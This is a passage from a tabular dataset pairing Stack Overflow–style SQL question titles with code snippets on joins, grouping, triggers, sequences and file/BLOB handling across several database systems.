    where t.prod_nubmer = toupdate.prod_number
"
27128,15709,SQL insert one record with multiple relational data in one transaction,"START TRANSACTION;

insert into (feilds name) values(Values);

insert into tbl_contact(CustomerId ,ContactType,ContacNumber) 
values((select max(CustomerId) from tbl_customer),'type1','Fax');

COMMIT;
"
420,16260,SQL Grouing and sub-totaling,"SELECT 
  FISCALYEAR, 
  DATENAME(Month,JVDate) as Month,
  ACCOUNTNUMBER,
  ACCOUNTDESCRIPTION, 
  CATEGORY, 
  POSTINGTYPE,
  sum(ORIGNETAMOUNT) as ORIGNETAMOUNT, 
FROM dbo.vw_GLTrialBalancev2010 
INNER JOIN GL00100 
        ON GL00100.ACTNUMBR_1 = dbo.vw_GLTrialBalancev2010.SEGMENT1 
        AND GL00100.ACTNUMBR_2 = dbo.vw_GLTrialBalancev2010.SEGMENT2
group by FISCALYEAR, DATENAME(Month,JVDate) as Month, ACCOUNTNUMBER, 
         ACCOUNTDESCRIPTION, CATEGORY, POSTINGTYPE
"
104,27982,Getting new unique number in SQL Server,"declare @table table (id int, code int) 
insert @table values (1, 1), (2, 2), (3, 3), (4, 45), (5, 5)

select top 1 t1.code + 1
from (select null as id, 0 as code union all select * from @table) t1
left join @table t2 on t2.code = t1.code + 1
where t2.code is null
order by t1.code
"
23853,64732,Oracle SQL Group by self made column?,"SELECT CASE
          WHEN teile LIKE 'S%' THEN
           'vent'
          ELSE
           teile
       END AS teile,
       SUM(amount) 
...
 GROUP BY 
       CASE
          WHEN teile LIKE 'S%' THEN
           'vent'
          ELSE
           teile
       END;
"
32004,11477,How do I get rid of Duplicate Entries With Unique IDs in MS Access 2003?,"Public Sub UpdateStudent()
    Dim oldID As String
    Dim newID As String

    oldID = ""ID1""
    newID = ""ID2""

    DoCmd.Execute ""update another_table set student_id='"" & newID & ""' where student_id="" & oldID
    DoCmd.Execute ""update yet_another_table set student_id='"" & newID & ""' where student_id="" & oldID
End Sub
"
25137,60340,How to mask date format in sql?,"SQL> SELECT SYSDATE - to_date('2015-05-20 09:21:11','YYYY-MM-DD HH24:MI:SS') diff,
  2         ROUND(
  3            SYSDATE - to_date('2015-05-20 09:21:11','YYYY-MM-DD HH24:MI:SS')
  4              ) diff_round
  5  FROM dual;

      DIFF DIFF_ROUND
---------- ----------
29.1248264         29

SQL>
"
12167,3645,How To Use The Where & Like Operator Together in SQL?,"SELECT firstname, lastname, state
FROM instructors
WHERE state = 'ga'
AND lastname LIKE '*son*'
"
15320,22343,SQL database (Firebird): problem with a foreign key,"YourTable.SenderFK --> Intermediary.PK
    Intermediary.SenderBufferstockFK --> tBufferstock.ID
    Intermediary.SenderFacilityFK --> tFacility.ID
    Intermediary.SenderOutsideLocationFK --> tOutsideLocation.ID
"
22532,58701,Returning integer value that represents the first non-null field,"SELECT
   /* Other Columns */
  CASE
    WHEN deIntroText IS NOT Null THEN 1
    WHEN deCompanyText IS NOT Null THEN 2
    WHEN deTimetableText IS NOT Null THEN 3
    WHEN deExampleText IS NOT Null THEN 4
  ELSE 5 END as OtherColumn
FROM
  /* Rest of query */
"
25842,66560,SQL Select post that has been replied to last (in same table),"select t.*
  from your_table t
  join (select max(id) as last_id
          from your_table
         where replyto is not null) v
    on t.id = v.last_id
"
30965,21940,How to select multiple email addresses from SQL query?,"select stuff((select '; ' + eMailColumn
from TableName
where SomeColumn = @conditionValue
    and eMailColumn is not NULL
for xml path('')), 1, 2, '')
"
24647,60463,TSQL Select all columns without first n from function/procedure,"DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX),
    @colTP as  NVARCHAR(MAX)

select @cols = stuff((select ','+quotename(C.name)
         from sys.columns as C
         where C.object_id = object_id('table1') and
               C.name like 'M%'
         for xml path('')), 1, 1, '')


set @query = 'SELECT id, 
              replace(timeperiod, ''M'', '''') timeperiod, 
              value
              from table1
            unpivot 
            (
               value
               for timeperiod in (' + @cols + ')
            ) u '

exec(@query)
"
21340,12731,How to enforce unique 2-tuple on oracle table?,"CREATE UNIQUE INDEX unq_match ON match ( LEAST(team1,team2), GREATEST(team1,team2) );
"
27055,41027,Formatting SQL output in Ruby,"puts $db.execute(SELECT first_name || ' - ' || age FROM info)
"
9127,55266,SQL group by NULL/ NOT NULL,"    select 
count(facebookid) ""linkedinid"", 
count(linkedinid) ""linkedinid"", 
count(googleid) ""googleid"", 
count(case 
         when facebookid is null 
              and linkedinid is null 
              and googleid is null then 1 else null end) direct
from your_table 
"
29154,21025,Categorize by columns,"SELECT DECODE(RN,1,A,NULL) AS A,
  DECODE(RN,1,B,NULL)      AS B,
  C,
  D,
  E
FROM
  (SELECT A,
    B,
    row_number() over (partition BY A,B order by A,B) AS RN,
    C,
    D,
    E
  FROM
    (SELECT * FROM TEST_TABLE ORDER BY A,B
    )
  );
"
7280,22129,Joining two tables and getting values,"SELECT t.id, s.name, s.value, s.type, s.description
FROM  App_Config s
LEFT JOIN Client_Config t
 ON(t.name = s.name and t.id = @id)
"
34092,18905,What is the meaning of '@' symbol in Oracle SQL?,"select * from question_answer@abcd where id = '45'
"
29202,30114,Can I combine local and remote dataset within SPARQL query?,"SELECT * WHERE {
  # the local part of the query
  ?s ?p ?id

  SERVICE <http://url/to/remote/data> {
    # The remote part of the query
    ?x ?y ?id
  }
}
"
14645,45292,How to see the actual optimized SQL query in a database,"Rows      Execution Plan
--------  ----------------------------------------------------
      12  SORT AGGREGATE
       2   SORT GROUP BY
   76563    NESTED LOOPS
   76575     NESTED LOOPS
      19      TABLE ACCESS FULL CN_PAYRUNS_ALL
   76570      TABLE ACCESS BY INDEX ROWID CN_POSTING_DETAILS_ALL
   76570       INDEX RANGE SCAN (object id 178321)
   76563     TABLE ACCESS BY INDEX ROWID CN_PAYMENT_WORKSHEETS_ALL
11432983      INDEX RANGE SCAN (object id 186024)
"
16242,66892,Dynamic Select from table at database link,"        string ls_sql

        ls_sql=""Select column_name  from table_name@""+var_db_link_name+""""+&
                  "" where column_name='""+var_value+""' and another_column_name='""+another_var+""'""

        DECLARE var_cursor DYNAMIC CURSOR FOR SQLSA ;

        PREPARE SQLSA FROM :ls_sql ;

        OPEN DYNAMIC var_cursor ;
        FETCH var_cursor INTO :another_var ;//another_var holds the result of the cursor
        CLOSE var_cursor;
"
31602,60778,Oracle SQL INNER Join based on non-matching values,"SELECT * FROM Table1 tl INNER JOIN Table2 t2 
ON (tl.ColA = t2.ColB OR (tl.ColA ='AB3' AND t2.ColB='AB_MNO_3')
OR (tl.ColA ='AB3' AND t2.ColB='AB_PQR_3') OR (tl.ColA ='AB4' AND t2.ColB='AB_MNO_4')
OR (tl.ColA ='AB4' AND t2.ColB='AB_PQR_4'))
"
21735,8010,Select records that are only associated with a record in another table,"SELECT C.CustomerName, P.PolicyID, PT.PolTypeName, Providers.ProviderName
FROM Customers C LEFT JOIN Policies P ON C.CustomerID = P.CustomerID
LEFT JOIN PolicyTypes PT ON P.PolicyTypeID = PT.PolicyTypeID
LEFT JOIN Providers PR ON PR.ProviderID = PT.ProviderID
WHERE PR.ProviderID = 100001 AND C.CustomerName NOT IN (
    SELECT C.CustomerName
    FROM Customers C LEFT JOIN Policies P ON C.CustomerID = P.CustomerID
    LEFT JOIN PolicyTypes PT ON P.PolicyTypeID = PT.PolicyTypeID
    LEFT JOIN Providers PR ON PR.ProviderID = PT.ProviderID
    WHERE PR.ProviderID <> 100001
)
"
14051,50233,MySQL: get a list of tables that references a deleted row,"select c.table_schema,u.table_name,u.column_name,u.referenced_column_name
from information_schema.table_constraints as c
inner join information_schema.key_column_usage as u
using( constraint_schema, constraint_name )
where c.constraint_type = 'FOREIGN KEY'
and u.referenced_table_schema='your_db_name'
and u.referenced_table_name = 'your_table_name'
order by c.table_schema,u.table_name;
"
39548,18517,How to convert empty string to null in SQLite,"SELECT NULLIF(MyColumn, '') FROM MyTable
"
11454,56547,"Delete and join, then set a column","CREATE TRIGGER decrease_tags_use_number BEFORE DELETE ON links
  FOR EACH ROW BEGIN
    UPDATE tags SET use_number = use_number - 1 WHERE id = OLD.tag_id;
  END;
"
1166,28773,Update duplicate rows except for one,"update 
wt_simple_data w1 
join ( 
  select 
   min(SIMPLEID) as SIMPLEID,
   CAMPID,
   MSISDN 
   from wt_simple_data 
   group by CAMPID,MSISDN 
)w2 
on w1.SIMPLEID > w2.SIMPLEID 
and w1.CAMPID = w2.CAMPID 
and w1.MSISDN = w2.MSISDN 
set w1.FLAG = '2' 
"
31991,52379,get rows which have a higher date than a specific one in MM/DD/YYYY format,"select * from XTABLE where XDATE >= date '2011-10-21'
"
36841,34996,MySQL join two tables based on a time field returning the largest previous time,"SELECT
  e.Name,
  v.Video,
  TO_SECONDS(v.StartTime) - TO_SECONDS(e.EventTime) AS SecsIntoVideo
FROM EventTable e
  LEFT JOIN VideoTable v
    ON e.EventTime BETWEEN v.StartTime AND v.starttime + INTERVAL (v.DurationSecs)
"
12700,32757,Selecting records in on table based on conditions from another table,"scope :not_engaged_on, lambda { |q| where([""NOT EXISTS (SELECT ID from engagements WHERE engagements.date = ? AND volunteer_id = volunteers.id)"", q])}

scope :not_engaged_between, lambda { |s, e| where([""NOT EXISTS (SELECT ID from engagements WHERE engagements.date BETWEEN ? AND ? AND volunteer_id = volunteers.id)"", s, e]) }
"
39170,31046,"How do I upload a file to a varbinary(max) column in SQL Server 2008, using TSQL?","USE AdventureWorks
GO
CREATE TABLE myTable(FileName nvarchar(60),
  FileType nvarchar(60), Document varbinary(max))
GO

INSERT INTO myTable(FileName, FileType, field_varbinary)
   SELECT 'Text1.txt' AS FileName,
      '.txt' AS FileType,
      * FROM OPENROWSET(BULK N'C:\Text1.txt', SINGLE_BLOB) AS Document
GO
"
38604,45855,How to generate random number using sql?,"with cte as (
  select DENSE_RANK() OVER (ORDER BY passportnumber) as rank,
    srno
  from table)
update cte
  set srno = rank;
"
39131,11122,T-SQL Pattern matching,"Select A.* from Users A JOIN dbo.Fn_Split(@ValueArrayString, '|') B on A.FirstName = B.value
"
35605,50225,SQL Server 2008 Update inside of case,"DECLARE @team_id CHAR(3)
, @code CHAR(4) 
 IF ( @team_id IN ( '03V' , '09X' ) ) 
  BEGIN

        ;WITH  CTE
                AS ( SELECT TOP 1
                                COUNT(a.id) AS count
                              , a.employee_id
                     FROM       event.dbo.event a
                                JOIN event.dbo.event_triage b
                                      ON a.employee_id = b.employee_id
                     WHERE      task_id IN ( 'WS' , 'WF' , 'WT' , 'WU' )
                                AND a.status = 1
                                AND b.team_id = @team_id
                     GROUP BY   a.employee_id
                     ORDER BY   count ASC
                   )
              UPDATE      a
              SET         intake_caller_id = ( SELECT employee_id FROM CTE)
              FROM        event.dbo.referral_data AS a
              WHERE       CODE_ = @code
                          AND ISNULL(a.intake_caller_id,'')=''                                     

        SELECT      a.intake_caller_id
        FROM        event.dbo.referral_data a
        WHERE       CODE_ = @code
  END
ELSE  
  IF ( @team_id IN ( '00R' , '154' ) ) 
        BEGIN
              SELECT      CASE WHEN @team_id = '00R'
                                    AND intake_rx_caller_id IS NOT NULL
                                    AND intake_rx_caller_id <> '' THEN intake_rx_caller_id
                               WHEN @team_id = '00R'
                                    AND ( intake_rx_caller_id IS NULL
                                          OR intake_rx_caller_id = ''
                                        ) THEN ( SELECT employee_id
                                                 FROM   ( SELECT TOP 1
                                                                    COUNT(a.id) AS count
                                                                  , a.employee_id
                                                          FROM      event.dbo.event a
                                                                    JOIN event.dbo.event_triage b
                                                                          ON a.employee_id = b.employee_id
                                                          WHERE     task_id IN ( 'WR' , 'CR' )
                                                                    AND status = 1
                                                                    AND b.team_id = '00R'
                                                          GROUP BY  a.employee_id
                                                          ORDER BY  count ASC
                                                        ) a
                                               )
                               WHEN @team_id = '154'
                                    AND reorder_rx_caller_id IS NOT NULL
                                    AND reorder_rx_caller_id <> '' THEN reorder_rx_caller_id
                               WHEN @team_id = '154'
                                    AND ( reorder_rx_caller_id IS NULL
                                          OR reorder_rx_caller_id = ''
                                        ) THEN ( SELECT employee_id
                                                 FROM   ( SELECT TOP 1
                                                                    COUNT(a.id) AS count
                                                                  , a.employee_id
                                                          FROM      event.dbo.event a
                                                                    JOIN event.dbo.event_triage b
                                                                          ON a.employee_id = b.employee_id
                                                          WHERE     task_id IN ( 'RS' , 'RY' )
                                                                    AND status = 1
                                                                    AND b.team_id = '154'
                                                          GROUP BY  a.employee_id
                                                          ORDER BY  count ASC
                                                        ) a
                                               )
                          END
              FROM        event.dbo.doctor_data
              WHERE       CODE_ = @code 
        END
"
28647,5084,dbcontext.savechanges always saves default Value,"[DatabaseGenerated(DatabaseGeneratedOption.Computed)] 
"
21308,29268,SQL query to retrieve WooCommerce orders grouped by state,"select
    state,
    sum(order_tax_sum),
    sum(order_total_sum)
from (
    select
        (select meta_value from wp_postmeta pm1 where p.ID = pm1.post_id and meta_key = ""_billing_state"") as state,
        (select meta_value from wp_postmeta pm2 where p.ID = pm2.post_id and meta_key   = ""_order_tax"") as order_tax_sum,
        (select meta_value from wp_postmeta pm3 where p.ID = pm3.post_id and meta_key   = ""_order_total"") as order_total_sum
    from
        wp_posts AS p
    WHERE post_type = ""shop_order""
) A
group by A.state
"
21488,71661,Why is this SQL SUM statement correct?,"(SUM(T.PercentComplete * T.Hours) / 100) / SUM(T.Hours)
"
26651,34873,sql distinct select from multiple select,"SELECT ct.id
FROM [Customer].[dbo].[Contact] ct join
     [Customer].[dbo].[HN_Customer_ids] hnids
     on ct.id = hnids.contact_id join
     [CustomerTransactions].[dbo].[Transaction_Header] trh
     on trh.Customer_ID = hnids.HN_customer_id
WHERE trh.actual_transaction_date > '20120218'
UNION
SELECT contact_id
FROM [Customer].[dbo].[Restaurant_Attendance]
WHERE (created > '2012-02-18 00:00:00.000' or
       modified > '2012-02-18 00:00:00.000')
UNION
SELECT aaa.id
FROM [Customer].[dbo].[Contact] aaa ;
"
21817,54364,Set value to 0 if it doesn't exist,"SELECT COALESCE(AVG(CASE WHEN questionId = 1 THEN rating END), 0) as avgRating,
       strftime('%H:00', date) as hour
FROM ratings r
WHERE strftime('%Y-%m-%d', date) = strftime('%Y-%m-%d', 'now')
GROUP BY strftime('%H', date);
"
35221,10776,sql sub query,"empid   dept 	sal 	c
emp001  d001 	10000 	3
emp004  d001 	10000 	3
emp002  d001 	10000 	3
emp006  d003 	5000 	2
emp005  d003 	5000 	2
emp003  d002 	20000 	1
"
21613,64206,How can I extract files from an Oracle BLOB field?,"DECLARE
  l_file      UTL_FILE.FILE_TYPE;
  l_buffer    RAW(32767);
  l_amount    BINARY_INTEGER := 32767;
  l_pos       NUMBER := 1;
  l_blob      BLOB;
  l_blob_len  NUMBER;
BEGIN

  SELECT blobcol
  INTO   l_blob
  FROM   table
  WHERE  rownum = 1;

  l_blob_len := DBMS_LOB.getlength(l_blob);

  -- Open the destination file.
  l_file := UTL_FILE.fopen(<location>,<filename>,'wb', 32767);

  WHILE l_pos < l_blob_len LOOP
    DBMS_LOB.read(l_blob, l_amount, l_pos, l_buffer);
    UTL_FILE.put_raw(l_file, l_buffer, TRUE);
    l_pos := l_pos + l_amount;
  END LOOP;

  -- Close the file.
  UTL_FILE.fclose(l_file);

END;
/
"
29665,44377,SQL - if or something else,";with InitialQuery as 
(
    select  Item.No_, Entry.Quantity, MinMax.MaxQuantity, Entry.Location, Item.MainLocation
    from Item
    join Entry on Item.No_ = Entry.[Item No_]
    join MinMax on Item.No_ = MinMax.Item No_
)
, Sources as
(
    select * from InitialQuery
    where Location=MainLocation and Quantity=30
)
, Destinations as 
(
    select 
        i.*,
        i.MaxQuantity - i.Quantity 'Needed'
    from Sources s
    join InitialQuery i on i.No_=s.No_ and i.MainLocation=s.MainLocation and i.Location<>s.Location
)
select 
    s.No_,
    (s.Quantity - d.NoTransferred) 'Quantity',
    s.MaxQuantity,
    s.Location,
    s.MainLocation
from Sources s
join (
        select No_, MainLocation, sum(Needed) 'NoTransferred' from Destinations group by No_, MainLocation
    ) d on d.No_=s.No_ and d.MainLocation=s.MainLocation
union all
select 
    No_,
    MaxQuantity 'Quantity',
    MaxQuantity,
    Location,
    MainLocation
from Destinations
"
19589,50472,Update one of 2 duplicates in an sql server database table,";WITH cte AS
(
  SELECT
      ROW_NUMBER() OVER(PARTITION BY Column1  ORDER BY Column1 ) AS rno,
      Column1 
  FROM Clients
)

UPDATE cte SET Column1 =Column1 +' 1 '
WHERE rno=2
"
28702,46373,Autogenerate ID in stored procedure -SQL,"ALTER TABLE Add IdKey INT IDENTITY(1,1)
"
12953,8240,Sql Self join query? How to get categories sub categories?,"select l0.catID,
    concat(
      case when l5.catID is null then '' else concat(l5.category, '/') end
    , case when l4.catID is null then '' else concat(l4.category, '/') end
    , case when l3.catID is null then '' else concat(l3.category, '/') end
    , case when l2.catID is null then '' else concat(l2.category, '/') end
    , case when l1.catID is null then '' else concat(l1.category, '/') end
    , l0.category)
from catcat l0
left join catcat l1 on l0.parentID=l1.catID
left join catcat l2 on l1.parentID=l2.catID
left join catcat l3 on l2.parentID=l3.catID
left join catcat l4 on l3.parentID=l4.catID
left join catcat l5 on l4.parentID=l5.catID
"
5600,44367,making query with multiple tables,"$q = ""SELECT keyword, col, city_name, image_name, tutor_code 
            FROM (
                SELECT tutor_name AS keyword, 'Tutors' AS col, IFNULL(c1.city_name, '') city_name, IFNULL(ti.image_name, '') image_name, tutor_code FROM tutors AS t
                LEFT JOIN address a ON t.address_id = a.address_id
                LEFT JOIN city c1 ON a.city_id = c1.city_id 
                LEFT JOIN tutor_images ti ON t.tutor_id = ti.tutor_id and ti.image_type = 'profile'
                UNION
                SELECT subjects AS keyword, 'Subject' AS col, '' city_name, '' image_name, '' tutor_code FROM subject
                UNION
                SELECT city_name AS keyword, 'City' AS col, '' city_name, '' image_name, '' tutor_code FROM city
                UNION
                SELECT institute_name AS keyword, 'Institute' AS col, '' city_name, '' image_name, '' tutor_code FROM institutes
            ) s
          WHERE keyword LIKE '%$queryString%' 
          LIMIT 10"";
"
38036,72508,"Store, retrieve and update a sequence number (datatype int) in a single row of a table in SQL Server 2008","declare @id int

update Seqtbl
set @id = seqnum, seqnum = seqnum + 1
where lookupval = 'nosebleed'
"
32097,31032,ETL into operational oracle database - used by jsp/spring/hibernate app,"> drop sequence seq_test;
sequence SEQ_TEST dropped.
> create sequence seq_test start with 1 increment by 1;
sequence SEQ_TEST created.
> select seq_test.nextval from dual;
NEXTVAL                
---------------------- 
1                      

> alter sequence seq_test increment by 500;
sequence SEQ_TEST altered.
> select seq_test.nextval from dual;
NEXTVAL                
---------------------- 
501                    

> alter sequence seq_test increment by 1;
sequence SEQ_TEST altered.
> select seq_test.nextval from dual;
NEXTVAL                
---------------------- 
502    
"
36212,11895,"Is ""Version"" a Reserved word in TRANSACT-SQL? (Shows Blue but not in Reserved word list)","DESCRIPTION
SERVER
INSTEAD
"
659,4163,Find full path of a file in a file system,"WITH RECURSIVE t AS
(SELECT id, name, parent, name as path
FROM file
WHERE id=3
UNION ALL
SELECT si.id,si.name,
si.parent,
si.name || '/' || sp.path as path
FROM file As si
INNER JOIN t AS sp
ON (si.id = sp.parent)
)
SELECT *
FROM t where parent is null
ORDER BY path
"
5999,11756,Combine DBGrid column values,"SELECT 
  sdate, 
  stime, 
  CONCAT(CAST(pcid AS CHAR), '_', CAST(billno AS CHAR)) AS MachineAndBillNo,
  c.customer_name,
  ...
"
3493,69917,How to specify a specific value for an auto increment column in SQL Server?,"SET IDENTITY_INSERT MyTableName ON

INSERT INTO MyTableName
(IdField, <list of all the fields>)
VALUES
(999, <list of other values)

SET IDENTITY_INSERT MyTableName OFF

DBCC CHECKIDENT(MyTableName, RESEED, 2)
"
4221,22319,"How to find the child project of a parent project which is passed in the 'WHERE' clause and also, to find the duplicate objects","SELECT A.projectName as PARENT,COUNT(A.PROJECTNAME) AS PARENTPROJECTCOUNT, 
    B.ProjectName as CHILD, COUNT(B.PROJECTNAME) AS CHILDPROJECT from psprojectitem 
a INNER JOIN psProjectItem B 
ON a.objecttype = b.objecttype 
AND a.objectid1 =b.objectid1 
AND a.objectvalue1 = b.objectvalue1 
AND a.objectid2 = b.objectid2 
AND a.objectvalue2 = b.objectvalue2 
AND a.objectid3 = b.objectid3 
AND a.objectvalue3 = b.objectvalue3 
AND a.objectid4 = b.objectid4 
AND a.objectvalue4 = b.objectvalue4 
WHERE A.projectname in 
(SELECT ProjectName from psProjectDefn WHERE lastupdoprid <> 'pplsoft') 
AND a.projectname <> B.projectName 
and A.PROJECTNAME = 'AAAA_JOB_KJ' 
ORDER BY B.PROJECTNAME
"
8468,20178,SQL get date month from query,"select
    Convert(varchar(2), MONTH(dbo.tblInvoices.InvoiceDate))
    + '/' + Convert(varchar(4), Year(dbo.tblInvoices.InvoiceDate)) as date
from
    dbo.tblInvoices

Select
    Convert(varchar(6), dbo.tblInvoices.InvoiceDate, 112) As InvoiceYearMonth
From
    dbo.tblInvoices
"
24101,40992,T-SQL: how to number items in non-unique groups,"SELECT UserID, [Date], IsSuccessful,
       ROW_NUMBER() OVER (PARTITION BY UserID, IsSuccessful, grp 
                          ORDER BY [Date]) AS cnt
FROM (
  SELECT UserID, [Date], IsSuccessful,
         ROW_NUMBER() OVER (PARTITION BY UserID 
                            ORDER BY [Date]) -
         ROW_NUMBER() OVER (PARTITION BY UserID, IsSuccessful 
                            ORDER BY [Date]) AS grp
FROM UserLogins) AS t
"
25766,75340,SQL Query for amount of products sold within dates?,"SELECT op.op_products_name, op.op_products_id, SUM(op.op_products_qty) AS TotalSold
FROM orders_products op JOIN
     orders o
     ON op.op_order_id = o.orders_id
WHERE o.orders_date_purchased BETWEEN '2012-11-05 00:00:00' AND '2012-11-10 00:00:00'
GROUP BY op.op_products_id
ORDER BY TotalSold DESC;
"
8314,24965,sql - multiple values to test function,"with testdata as (
  select 'teststring1' as tvalue from dual
  union all
  select '$kfjs' from dual
  union all
  select 'str1' || chr(10) || 'str2' from dual
  union all
  select '    <>' from dual
  union all
  select null from dual
  union all
  select '[{}&,''/' from dual
)
select rownum, tvalue, regexp_replace(tvalue, '([[:cntrl:]])', '') from testdata
where tvalue <> regexp_replace(tvalue, '([[:cntrl:]])', '');
"
36525,42434,Deleting records that are not joined on in SQL,"DELETE Customers
FROM   Customers c
WHERE NOT EXISTS (
    SELECT 1
    FROM Orders o
    WHERE o.CustomerID = c.ID
)
"
17598,68345,sql query group by count," select name, date, count(*)
 from table1
 group by name, date
"
13729,10226,How to combine sql request with data in another table,"select uc.id,
       uc.name,
       (select count 
          from counts_data cd 
          where cd.id_user = uc.id
          order by date desc limit 1) as count,
       ifnull((select count 
                 from counts_data cd 
                 where cd.id_user = uc.id 
                 order by date desc limit 1 offset 1),0) as count_before
from users_counts uc;
"
8720,60347,How to return a row where joins ALL exist SQL,"SELECT table1.col1, ....
FROM table1 
INNER JOIN table2 
  ON table2.whateverrelation = table1.whateverrelation 
GROUP BY  table1.col1, ....
HAVING SUM(table2.matching = 1) > 0
   AND SUM(table2.matching = 2) > 0;
"
29090,49465,SQLite Insert or Replace Where,"INSERT OR REPLACE INTO decryptionKeys VALUES (""999"",""Birthday"",""25.12.1988"")
"
4482,70095,Best way to detect which columns was updated when using triggers,"CREATE TABLE test (
ID Int NOT null IDENTITY(1,1),
NAME VARCHAR(50),
Age INT
)

 GO
---------------------------------------
CREATE TRIGGER tr_test ON test FOR UPDATE 

AS

DECLARE @cols varbinary= COLUMNS_UPDATED()
DECLARE @altered TABLE(colid int)
DECLARE @index int=1

WHILE @cols>0 BEGIN
    IF @cols & 1 <> 0 INSERT @altered(colid) VALUES(@index)
    SET @index=@index+1
    SET @cols=@cols/2
END 

DECLARE @text varchar(MAX)=''
SELECT @text=@text+C.COLUMN_NAME+', '
FROM information_schema.COLUMNS C JOIN @altered A ON c.ordinal_position=A.colid
WHERE table_name='test'

PRINT @text

GO
------------------------------------------------------
INSERT test(NAME, age) VALUES('test',12)
UPDATE test SET age=15
UPDATE test SET NAME='fred'
UPDATE test SET age=18,NAME='bert'
DROP TABLE test
"
18755,153,Joining on an XML attribute,"    CREATE TABLE #table1 ( id1 INT, col1 VARCHAR(50) );
    CREATE TABLE #table2
        (
          id2 VARCHAR(1)
        , col2 VARCHAR(4)
        );

    INSERT  INTO #table1
            ( id1
            , col1
            )
    VALUES  ( '1'
            , '<a><b id=""1""></b><b id=""2""></b></a>'
            );

    INSERT  INTO #table2
            ( id2, col2 )
    VALUES  ( '1', 'val1' ),
            ( '2', 'val2' );
 ;
    WITH    c AS ( SELECT   id1
                          , col1 = CONVERT(XML, col1)
                   FROM     #table1 t
                 )
        SELECT  id1
              , col1
              , id2
              , col2
        FROM    c
                CROSS APPLY c.col1.nodes('(/a/b)') q ( x )
                LEFT JOIN #table2 t2 ON t2.ID2 = x.value('./@id', 'varchar(1)')


    DROP TABLE #table1, #table2
"
14291,22206,Insert + Select statements in one Query<T> gives ORA-00933: SQL command not properly ended,"  var param = new DynamicParameters();
param.Add(name: ""IinsValue"", value: value, direction: ParameterDirection.Input);
param.Add(name: ""Id"", dbType: DbType.Int32, direction: ParameterDirection.Output);
param.Add(name: ""Value"", dbType: DbType.String, direction: ParameterDirection.Output);
Connection.Execute(""INSERT INTO Table(Id, Value) Values(1, :value) returning Id,Values into :id, :value"", param );
var Id = param.get<int>(""Id"");
var Val = param.get<String>(""Value"");
"
25610,45604,Foreign key for multiple tables and columns?,"CREATE TABLE user(
  id INT(11) NOT NULL AUTO_INCREMENT,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(20) NOT NULL,
  PRIMARY KEY (id)
);

CREATE TABLE items(
  i_id INT(11) NOT NULL AUTO_INCREMENT,
  name TINYTEXT NOT NULL,
  price DECIMAL(8,2) NOT NULL,
  PRIMARY KEY (i_id)
);

CREATE TABLE user_purchase(
  i_id INT(11) NOT NULL,
  name TINYTEXT NOT NULL,
  id INT(11) NOT NULL,
  FOREIGN KEY (i_id) REFERENCES items(i_id),
  FOREIGN KEY (id) REFERENCES user(id)
);
"
17824,23507,"Stored Procedure with optional ""WHERE"" parameters","SELECT * FROM table 
WHERE ((@status_id is null) or (status_id = @status_id))
and ((@date is null) or ([date] = @date))
and ((@other_parameter is null) or (other_parameter = @other_parameter))
"
32279,53757,DATEDIFF function in Oracle,"SELECT TO_DATE('2000-01-02', 'YYYY-MM-DD') -  
       TO_DATE('2000-01-01', 'YYYY-MM-DD') AS DateDiff
FROM   dual
"
37510,17715,"ODP.NET UPDATE... RETURNING INTO... multiple rows, Parameter type","try
{
    conn.Open();
    transaction = conn.BeginTransaction();

    cmd = new OracleCommand();
    cmd.Connection = GetConnection();

    cmd.CommandText =
        ""BEGIN UPDATE some_table "" +
        ""SET status = 'locked', "" +
        ""    locked_tstamp = SYSDATE, "" +
        ""    user_name = '"" + user + ""' "" +
        ""WHERE rownum <= 4 "" +
        ""RETURNING id BULK COLLECT INTO :id; END;"";

    cmd.CommandType = CommandType.Text;

    cmd.BindByName = true;
    cmd.ArrayBindCount = 4;

    p = new OracleParameter();
    p.ParameterName = ""id"";
    p.Direction = ParameterDirection.Output;
    p.OracleDbType = OracleDbType.Int64;
    p.Size = 4;
    p.ArrayBindSize = new int[] { 10, 10, 10, 10 };
    p.CollectionType = OracleCollectionType.PLSQLAssociativeArray;
    cmd.Parameters.Add(p);

    int nRowsAffected = cmd.ExecuteNonQuery();

    // nRowsAffected is always -1 here
    // we can check the number of ""locked"" rows only by counting elements in p.Value (which is returned as OracleDecimal[] here)
    // note that the code also works if less than 4 rows are updated, with the exception of 0 rows
    // in which case an exception is thrown - see below
    ...
}
catch (Exception ex)
{
    if (ex is OracleException && !String.IsNullOrEmpty(ex.Message) && ex.Message.Contains(""ORA-22054"")) // precision underflow (wth)..
    {
        Logger.Log.Info(""0 rows fetched"");
        transaction.Rollback();
    }
    else
    {
        Logger.Log.Error(""Something went wrong during Get : "" + ex.Message);
        ret = null;
        transaction.Rollback();
    }
}
finally
{
    // do disposals here
}
...
"
24743,47320,Detect TOP 5 from B for each record in A,"declare @entrant bigint

DECLARE entrant_cursor CURSOR FOR 
SELECT entrantID
FROM  recEntrantStatus r
WHERE r.roundId = @input
AND r.voted = 1
AND r.enterNextround = 1

OPEN entrant_cursor



FETCH NEXT FROM entrant_cursor 
INTO @entrant

 WHILE @@FETCH_STATUS = 0
   BEGIN
    INSERT INTO recEntrantStatus (entrantId, roundId, judgeId, notified, voted, enterNextRound)
SELECT 
    r.entrantId, 
  (@input + 1), 
j.Id /*Now getting tblJudges Id*/,  -- fixed name
0, 
0, 
0
FROM recEntrantStatus r
-- Get all of the judges
CROSS JOIN (SELECT TOP(5) MEM.Id, ISNULL(ES.EntrantCount, 0) EntrantCount
            FROM recMembers MEM
            LEFT JOIN
            (
                SELECT judgeid, COUNT(judgeid) AS 'EntrantCount' -- name this
                FROM recEntrantStatus
                WHERE roundId = 1
                GROUP BY judgeid
            ) ES ON MEM.Id = ES.judgeid
            WHERE MEM.Privilege = 2
            ORDER BY EntrantCount ) AS j
WHERE r.roundId = @input
AND r.voted = 1
AND r.enterNextround = 1
and r.entrantID = @entrant

FETCH NEXT FROM entrant_cursor 
INTO @entrant

END 
CLOSE entrant_cursor;
DEALLOCATE entrant_cursor;
"
29765,6612,MySQL find duplicate rows between certain days,"select *
from tickets t1
join tickets t2 on
    t1.id <> t2.id
    and t1.operator_id = t2.operator_id
    and t1.product_id = t2.product_id
    and ABS(DATEDIFF(t1.created_timestamp, t2.created_timestamp)) <= 2
;
"
16303,11304,Given Date parameter is considered as Date Time parameter,"Declare @Date datetime='2014-08-28 00:00:00.000'

select * from Table
where  CONVERT(nvarchar(20),Date,105) = CONVERT(nvarchar(20),@Date,105)
"
14935,23641,How do i get top 5 score in mysql,"SELECT s.*
FROM student AS s
  JOIN
